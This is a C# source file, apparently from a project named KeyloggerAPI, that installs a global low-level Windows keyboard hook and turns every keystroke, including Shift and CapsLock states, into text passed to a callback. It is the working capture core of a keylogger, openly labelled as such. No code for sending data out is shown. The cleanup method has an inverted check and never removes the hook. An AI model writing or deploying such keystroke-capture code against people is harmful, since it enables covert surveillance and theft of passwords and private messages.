using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyloggerAPI
{
	public class API : IDisposable
	{
		private IntPtr globalKeyboardHookId;
		private IntPtr currentModuleId;
		private const int WH_KEYBOARD_LL = 13;
		private const int WH_MOUSE_LL = 14;
		private const int WM_KEYDOWN = 0x100;
		private const int WM_SYSKEYDOWN = 0x104;

		private Action<string> keyPressedCallback;

		public API()
		{
			Process currentProcess = Process.GetCurrentProcess();
			ProcessModule currentModudle = currentProcess.MainModule;
			this.currentModuleId = User32.GetModuleHandle(currentModudle.ModuleName);
		}

		public void CreateKeyboardHook(Action<string> keyPressedCallback)
		{
			this.keyPressedCallback = keyPressedCallback;
			this.globalKeyboardHookId = User32.SetWindowsHookEx(WH_KEYBOARD_LL, HookKeyboardCallback, this.currentModuleId, 0);
		}

		private IntPtr HookKeyboardCallback(int nCode, IntPtr wParam, IntPtr lParam)
		{
			int wParamAsInt = wParam.ToInt32();

			if (nCode >= 0 && (wParamAsInt == WM_KEYDOWN || wParamAsInt == WM_SYSKEYDOWN))
			{
				bool shiftPressed = false;
				bool capsLockActive = false;

				var shiftKeyState = User32.GetAsyncKeyState(Keys.ShiftKey);
				if (FirstBitIsTurnedOn(shiftKeyState))
					shiftPressed = true;

				//We need to use GetKeyState to verify if CapsLock is "TOGGLED" 
				//because GetAsyncKeyState only verifies if it is "PRESSED" at the moment
				if (User32.GetKeyState(Keys.Capital) == 1)
					capsLockActive = true;

				KeyParser(wParam, lParam, shiftPressed, capsLockActive);
			}

			//Chain to the next hook. Otherwise other applications that 
			//are listening to this hook will not get notificied
			return User32.CallNextHookEx(globalKeyboardHookId, nCode, wParam, lParam);
		}

		private static string CurrentWindowTitle()
		{
			int hwnd = User32.GetForegroundWindow();
			StringBuilder title = new StringBuilder(1024);

			int textLength = User32.GetWindowText(hwnd, title, title.Capacity);
			if ((textLength <= 0) || (textLength > title.Length))
				return "Unknown";

			return title.ToString();
		}

		private bool FirstBitIsTurnedOn(short value)
		{
			//0x8000 == 1000 0000 0000 0000			
			return Convert.ToBoolean(value & 0x8000);
		}

		private void KeyParser(IntPtr wParam, IntPtr lParam, bool shiftPressed, bool capsLockPressed)
		{
			int key = Marshal.ReadInt32(lParam);			
			var vk = (VK)key;

			String temp = "";

			#region vk
			switch (vk)
			{
				case VK.VK_F1:
					temp = "<F1>";
					break;
				case VK.VK_F2:
					temp = "<F2>";
					break;
				case VK.VK_F3:
					temp = "<F3>";
					break;
				case VK.VK_F4:
					temp = "<F4>";
					break;
				case VK.VK_F5:
					temp = "<F5>";
					break;
				case VK.VK_F6:
					temp = "<F6>";
					break;
				case VK.VK_F7:
					temp = "<F7>";
					break;
				case VK.VK_F8:
					temp = "<F8>";
					break;
				case VK.VK_F9:
					temp = "<F9>";
					break;
				case VK.VK_F10:
					temp = "<F10>";
					break;
				case VK.VK_F11:
					temp = "<F11>";
					break;
				case VK.VK_F12:
					temp = "<F12>";
					break;
				case VK.VK_SNAPSHOT:
					temp = "<print screen>";
					break;
				case VK.VK_SCROLL:
					temp = "<scroll>";
					break;
				case VK.VK_PAUSE:
					temp = "<pause>";
					break;
				case VK.VK_INSERT:
					temp = "<insert>";
					break;
				case VK.VK_HOME:
					temp = "<home>";
					break;
				case VK.VK_DELETE:
					temp = "<delete>";
					break;
				case VK.VK_END:
					temp = "<end>";
					break;
				case VK.VK_PRIOR:
					temp = "<page up>";
					break;
				case VK.VK_NEXT:
					temp = "<page down>";
					break;
				case VK.VK_ESCAPE:
					temp = "<esc>";
					break;
				case VK.VK_NUMLOCK:
					temp = "<numlock>";
					break;
				case VK.VK_TAB:
					temp = "<tab>";
					break;
				case VK.VK_BACK:
					temp = "<backspace>";
					break;
				case VK.VK_RETURN:
					temp = "<enter>";
					break;
				case VK.VK_SPACE:
					temp = " ";
					break;
				case VK.VK_LEFT:
					temp = "<left>";
					break;
				case VK.VK_UP:
					temp = "<up>";
					break;
				case VK.VK_RIGHT:
					temp = "<right>";
					break;
				case VK.VK_DOWN:
					temp = "<down>";
					break;
				case VK.VK_MULTIPLY:
					temp = "*";
					break;
				case VK.VK_ADD:
					temp = "+";
					break;
				case VK.VK_SEPERATOR:
					temp = "|";
					break;
				case VK.VK_SUBTRACT:
					temp = "-";
					break;
				case VK.VK_DECIMAL:
					temp = ".";
					break;
				case VK.VK_DIVIDE:
					temp = "/";
					break;
				case VK.VK_OEM_1:
					temp = ";";
					break;
				case VK.VK_OEM_PLUS:
					temp = "=";
					break;
				case VK.VK_OEM_COMMA:
					temp = ",";
					break;
				case VK.VK_OEM_MINUS:
					temp = "-";
					break;
				case VK.VK_OEM_PERIOD:
					temp = ".";
					break;
				case VK.VK_OEM_2:
					temp = "/";
					break;
				case VK.VK_OEM_3:
					temp = "`";
					break;

				case VK.VK_OEM_4:
					temp = "´";
					break;
				case VK.VK_OEM_5:
					temp = @"]";
					break;
				case VK.VK_OEM_6:
					temp = "[";
				//EN-US
				//case VK.VK_OEM_4:
				//	temp = "[";
				//	break;
				//case VK.VK_OEM_5:
				//	temp = @"\";
				//	break;
				//case VK.VK_OEM_6:
				//	temp = "]";
					break;
				case VK.VK_OEM_7:
					temp = "'";
					break;
				case VK.VK_NUMPAD0:
					temp = "0";
					break;
				case VK.VK_NUMPAD1:
					temp = "1";
					break;
				case VK.VK_NUMPAD2:
					temp = "2";
					break;
				case VK.VK_NUMPAD3:
					temp = "3";
					break;
				case VK.VK_NUMPAD4:
					temp = "4";
					break;
				case VK.VK_NUMPAD5:
					temp = "5";
					break;
				case VK.VK_NUMPAD6:
					temp = "6";
					break;
				case VK.VK_NUMPAD7:
					temp = "7";
					break;
				case VK.VK_NUMPAD8:
					temp = "8";
					break;
				case VK.VK_NUMPAD9:
					temp = "9";
					break;
				case VK.VK_Q:
					temp = "q";
					break;
				case VK.VK_W:
					temp = "w";
					break;
				case VK.VK_E:
					temp = "e";
					break;
				case VK.VK_R:
					temp = "r";
					break;
				case VK.VK_T:
					temp = "t";
					break;
				case VK.VK_Y:
					temp = "y";
					break;
				case VK.VK_U:
					temp = "u";
					break;
				case VK.VK_I:
					temp = "i";
					break;
				case VK.VK_O:
					temp = "o";
					break;
				case VK.VK_P:
					temp = "p";
					break;
				case VK.VK_A:
					temp = "a";
					break;
				case VK.VK_S:
					temp = "s";
					break;
				case VK.VK_D:
					temp = "d";
					break;
				case VK.VK_F:
					temp = "f";
					break;
				case VK.VK_G:
					temp = "g";
					break;
				case VK.VK_H:
					temp = "h";
					break;
				case VK.VK_J:
					temp = "j";
					break;
				case VK.VK_K:
					temp = "k";
					break;
				case VK.VK_L:
					temp = "l";
					break;
				case VK.VK_Z:
					temp = "z";
					break;
				case VK.VK_X:
					temp = "x";
					break;
				case VK.VK_C:
					temp = "c";
					break;
				case VK.VK_V:
					temp = "v";
					break;
				case VK.VK_B:
					temp = "b";
					break;
				case VK.VK_N:
					temp = "n";
					break;
				case VK.VK_M:
					temp = "m";
					break;
				case VK.VK_0:
					temp = "0";
					break;
				case VK.VK_1:
					temp = "1";
					break;
				case VK.VK_2:
					temp = "2";
					break;
				case VK.VK_3:
					temp = "3";
					break;
				case VK.VK_4:
					temp = "4";
					break;
				case VK.VK_5:
					temp = "5";
					break;
				case VK.VK_6:
					temp = "6";
					break;
				case VK.VK_7:
					temp = "7";
					break;
				case VK.VK_8:
					temp = "8";
					break;
				case VK.VK_9:
					temp = "9";
					break;
				default: break;
			}
			#endregion

			#region To Upper Case

			if (shiftPressed)
			{
				if ((int)vk > 0x40 && (int)vk < 0x5B && capsLockPressed == false)
					temp = temp.ToUpper();

				if (vk == VK.VK_1) temp = "!";
				if (vk == VK.VK_2) temp = "@";
				if (vk == VK.VK_3) temp = "#";
				if (vk == VK.VK_4) temp = "$";
				if (vk == VK.VK_5) temp = "%";
				if (vk == VK.VK_6) temp = "^";
				if (vk == VK.VK_7) temp = "&";
				if (vk == VK.VK_8) temp = "*";
				if (vk == VK.VK_9) temp = "(";
				if (vk == VK.VK_0) temp = ")";
				if (vk == VK.VK_OEM_1) temp = ":";
				if (vk == VK.VK_OEM_2) temp = "?";
				if (vk == VK.VK_OEM_3) temp = "~";
				if (vk == VK.VK_OEM_COMMA) temp = "<";
				if (vk == VK.VK_OEM_MINUS) temp = "_";
				if (vk == VK.VK_OEM_PERIOD) temp = ">";
				if (vk == VK.VK_OEM_PLUS) temp = "+";

				if (vk == VK.VK_OEM_4) temp = "`";
				if (vk == VK.VK_OEM_5) temp = "}";
				if (vk == VK.VK_OEM_6) temp = "{";
				//EN-US
				//if (vk == VK.VK_OEM_4) temp = "{";
				//if (vk == VK.VK_OEM_5) temp = "|";
				//if (vk == VK.VK_OEM_6) temp = "}";
				if (vk == VK.VK_OEM_7) temp = "\"";
			}
			else if (capsLockPressed)
			{
				if ((int)vk > 0x40 && (int)vk < 0x5B) temp = temp.ToUpper();
			}

			#endregion

			keyPressedCallback.Invoke(temp);
		}

		public void Dispose()
		{
			if (globalKeyboardHookId == IntPtr.Zero)
				User32.UnhookWindowsHookEx(globalKeyboardHookId);
		}
	}
}
